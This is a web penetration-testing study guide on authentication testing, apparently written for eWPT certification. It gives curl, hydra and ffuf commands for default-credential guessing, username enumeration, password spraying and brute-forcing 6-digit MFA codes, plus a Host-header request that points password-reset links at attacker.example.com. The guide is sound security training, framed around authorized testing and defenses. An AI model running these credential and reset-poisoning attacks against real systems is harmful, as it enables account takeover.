# eWPT Methodology — Phase 02: Authentication Testing

> Web Application Penetration Testing · INE-Cybersecurity-Certifications-Guide

Authentication answers "who are you?" If an attacker can bypass it, every authorization control behind it is meaningless. This phase tests the login and identity lifecycle: credential strength, enumeration, rate limiting, password reset, multi-factor authentication (MFA), and the session tokens issued afterwards. Only test applications you are authorized to attack; brute force and enumeration are noisy and must respect the agreed rules of engagement.

## Default and Weak Credentials

Start cheap: vendors and administrators forget to change defaults more often than you would expect.

- Try documented defaults for the products you fingerprinted (Tomcat `tomcat/tomcat`, Jenkins `admin/admin` or no password, router `admin/admin`, WordPress installs with `admin/password`).
- Test common weak passwords against any freshly created account or provided test account before heavy tooling.
- Check whether the app enforces any password policy at registration or password change.

```bash
# Quick single-request checks (authorized targets only)
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' \
  -X POST https://app.example.com/login \
  -d 'username=admin&password=admin'

curl -s -o /dev/null -w '%{http_code}\n' \
  -u admin:admin https://app.example.com/protected/   # HTTP Basic default guess
```

Log every result — a 200 versus 302 versus 401 distinction tells you whether the pair worked, and whether the login endpoint even exists at that path.

## Username Enumeration

Before brute-forcing passwords, find out which usernames are valid. Enumerating users halves the work and is usually quieter than password guessing.

Distinguish valid from invalid users through any observable difference in the **response**:

- Different HTTP status codes (200 for "password incorrect", 302 redirect to error page for unknown user).
- Different response bodies or lengths ("Unknown username" vs "Wrong password").
- Timing differences (valid users may trigger password hashing work).
- Side channels: forgot-password messages, account-registration errors ("email already in use"), or API JSON differences.

```bash
# Classic oracle: measure the body length difference per username
for u in admin root nonexistent alice bob carlos; do
  body=$(curl -s -X POST https://app.example.com/login \
         -d "username=$u&password=WrongPass123!")
  printf '%-12s %5d bytes\n' "$u" "${#body}"
done
```

```text
# Burp Suite approach
# 1. Send the login request to Intruder.
# 2. Mark the "username" position with a payload marker.
# 3. Load a small username wordlist.
# 4. Compare status codes and response lengths in the results table.
```

If enumeration succeeds, note it as a low-severity finding by itself but a real enabler for the brute force below. If the app returns identical responses for every user, the oracle is closed — do not force it.

## Brute Force and Rate Limiting

The core question is: **does the server stop you?** Test the login flow for:

- Lockout after N failures (and whether the lockout is per-account or per-IP — per-IP lockout can be bypassed by rotating sources).
- CAPTCHA or challenge after repeated failures.
- Delays or backoff between attempts.
- Any rate limit at all on the login endpoint.

```bash
# bash loop: watch for a 429 (Too Many Requests) or lockout message
for i in $(seq 1 20); do
  code=$(curl -s -o /dev/null -w '%{http_code}' \
    -X POST https://app.example.com/login \
    -d "username=admin&password=guess$i")
  echo "attempt $i -> $code"
done
```

When limits are absent or weak, run a proper password spray or brute force:

```bash
# Password spraying: few passwords, many users (quieter and more realistic)
# hydra takes the target first and the module second: hydra [options] <target> <module> "<params>"
hydra -L users.txt -P top-passwords.txt -t 10 app.example.com https-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid username or password"

# ffuf can replay raw requests when hydra syntax gets awkward
ffuf -u https://app.example.com/login -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password=FUZZ' \
  -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt \
  -fs 4242   # filter the "wrong password" page length
```

Even when brute force fails, the finding "no rate limiting on the login form" is worth reporting: it enables offline-style guessing and account takeover at scale.

## Credential Stuffing (Concept)

Credential stuffing reuses username/password pairs leaked from other breaches, betting that people recycle passwords across sites. You should **understand** it, but almost never execute it in a real engagement without explicit permission and filtered, consented data.

- Same automation shape as brute force, but the wordlist is a list of real leaked pairs rather than generated guesses.
- Success rate is low (typically 1% or less) yet meaningful at scale; the app-side defenses are the same ones you just tested: rate limiting, lockout, CAPTCHA, breached-password checks (for example Troy Hunt's Have I Been Pwned API) at registration.
- As a tester, your job is usually to verify that **defenses** against stuffing exist, not to stuff credentials yourself.

```text
# What defense-in-depth against stuffing looks like (what to look for):
# - Login rate limits keyed to account + IP + device fingerprint
# - Lockout or step-up challenge after repeated failures
# - Mandatory MFA for sensitive actions
# - Breached-password detection at registration/password change
# - Anomaly detection (new device, new geolocation) with verification flows
```

## Password Reset Flaws

Password reset flows are a favorite target because they convert a design flaw into account takeover.

Attack patterns to check:

- **Predictable tokens:** the reset link contains a sequential, timestamped, or user-derivable token (`?token=1001`). Request two resets and compare tokens.
- **Token leakage in responses or logs:** the token echoed in the redirect URL, in a JSON response, or in the referer header.
- **Host header poisoning:** the reset email builds its link from the `Host` header, so an attacker-supplied host makes the victim's reset link point at the attacker. If you can influence it, the reset link (with token) travels to your server.
- **User-controllable reset target:** the "reset for user X" step lets you change the account identifier mid-flow (see also authorization in Phase 03).
- **Weak verification questions:** answers guessable from public data (birthplace, mother's maiden name).

```text
# Test idea 1 — token predictability (authorized target)
# 1. Request a reset for your own account twice, minutes apart.
# 2. Compare the tokens. Identical, sequential, or timestamp-prefixed tokens
#    mean the token space is small enough to brute force or guess.

# Test idea 2 — Host header influence
curl -s -X POST https://app.example.com/forgot-password \
  -H 'Host: attacker.example.com' \
  -d 'email=victim@example.com'
# If the reset email contains a link to attacker.example.com/reset?token=..., report it.
```

## MFA Weaknesses

Multi-factor authentication fails when the second factor can be bypassed or brute-forced.

Common weaknesses to verify:

- **Verification code not rate limited:** 6-digit codes have only 1,000,000 combinations; without limits, they are brute-forceable in hours.
- **Response manipulation:** the API returns a JSON flag such as `"mfa_required": false` and trusts a client-supplied value. Flip it and see if you skip the step.
- **MFA not enforced on all flows:** check whether password reset, "remember this device", or API token endpoints require MFA.
- **Backup codes never invalidated:** one-time backup codes remain valid after use.
- **Push/OTP race:** the same code accepted multiple times within its validity window.

```text
# Test idea — MFA step skipping
# 1. Log in with valid credentials and capture the request that triggers MFA.
# 2. Inspect the JSON/request for flags like "verifyMfa", "mfa", "step".
# 3. Replay the pre-MFA request while setting the flag to false or omitting the
#    MFA token entirely. If the server issues a session, the step is skippable.

# Test idea — brute-forcing a 6-digit OTP without rate limit
ffuf -u https://app.example.com/mfa/verify -X POST \
  -d 'session=ABC123&code=FUZZ' \
  -w <(seq -w 000000 999999) -fs 4540  # only if you are authorized and limits allow
```

## Session Management Basics

Authentication ends by issuing a session; session handling decides whether that session can be stolen or fixed.

### What to inspect on every cookie

```text
Set-Cookie: JSESSIONID=0A1B2C...; Path=/; HttpOnly; Secure; SameSite=Lax
```

- **HttpOnly missing** → JavaScript can read the cookie → XSS becomes session theft (Phase 04).
- **Secure missing** → cookie sent over plain HTTP → sniffable on the network.
- **SameSite absent/None** → CSRF exposure grows. No phase in this module develops
  CSRF end to end: treat the flag as the finding here and take the attack itself
  from the OWASP material in *Further Resources*.
- **No `__Host-`/`__Secure-` prefix** → weaker binding to origin; prefixing is best practice.
- **Session cookie vs persistent cookie:** long-lived "remember me" cookies widen the theft window; check whether they can be revoked server-side.

### Session token quality

- Tokens must be unpredictable and unique per session. Request several logins and compare tokens: sequential or time-patterned values (`a1, a2, a3...` or timestamps) are a finding.
- Check whether the session survives privilege change, password change, and logout (session fixation / poor invalidation).
- Check token scope: does the same token work for both the web UI and the API? For two different accounts?

```bash
# Compare tokens across logins for patterns
for i in 1 2 3; do
  curl -s -D - -o /dev/null -X POST https://app.example.com/login \
       -d 'username=alice&password=Password123!' | grep -i set-cookie
done

# Verify logout really kills the session: reuse the old cookie after logout
curl -s -b 'JSESSIONID=OLDTOKEN' https://app.example.com/account
```

## Common Mistakes & Tips

- **Attacking before reading the login flow.** A SPA may authenticate via JSON API while the HTML form only submits to it — find the real endpoint in the Network tab first.
- **Confusing lockout with rate limiting.** A per-account lockout after 5 tries is a strong control; a 200-ms sleep is not. Test which one exists and report it accurately.
- **Forgetting lockout bypasses.** Lockout keyed to username alone allows denial of service on a victim account — and lockout keyed to IP alone allows distributed brute force. Note which axis is protected.
- **Treating enumeration as a critical finding.** Valid-user enumeration is real but usually informational/low; it becomes critical only when it feeds a successful takeover. Report the chain, not just the oracle.
- **Skipping the second factor.** Testers who stop at "MFA present" miss skippable-MFA and brute-forceable-OTP issues that defeat the whole control.
- **Not checking session fixation.** Log in from a token you chose before authenticating (set `JSESSIONID=attacker-chosen` then authenticate); if the app keeps your value, an attacker who plants a token can hijack the session.
- **Volume discipline.** Brute force is the noisiest test you will run. Confirm rate limits with a handful of requests first, then scale only as authorized.

## Checklist / Self-Test

- [ ] I tested documented default credentials for the fingerprinted products/panels.
- [ ] I checked for username enumeration and confirmed it with at least two response differences.
- [ ] I verified whether login is rate limited or lockout-protected and on which axis (user, IP, both).
- [ ] I ran a password spray or brute force only within the agreed limits and filtered results properly.
- [ ] I reviewed the password reset flow for token predictability, leakage, and Host-header influence.
- [ ] I tested MFA for skippable steps, missing enforcement, and brute-forceable OTP codes.
- [ ] I inspected session cookies for HttpOnly, Secure, SameSite, and prefix best practices.
- [ ] I confirmed logout and password change invalidate the old session.

> **Verification:** executed against Hydra 9.5 on 2026-09-19 against a local listener: the spray
> line above found the planted credential (`[18080][http-post-form] host: 127.0.0.1 login: admin
> password: x`), while the previous spelling with `https-post-form` before the host ended in
> `[ERROR] Unknown service: /login:…`. ffuf was not run against a real login form, so that line
> remains a syntax reference.

## Further Resources

- OWASP Top 10 — A07 Identification and Authentication Failures: https://owasp.org/www-project-top-ten/
- OWASP Web Security Testing Guide — WSTG-ATHN (Authentication Testing) and WSTG-SESS (Session Management Testing) chapters: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Web Security Academy — "Authentication" topic with labs for enumeration, brute force, reset flaws, and MFA bypasses: https://portswigger.net/web-security
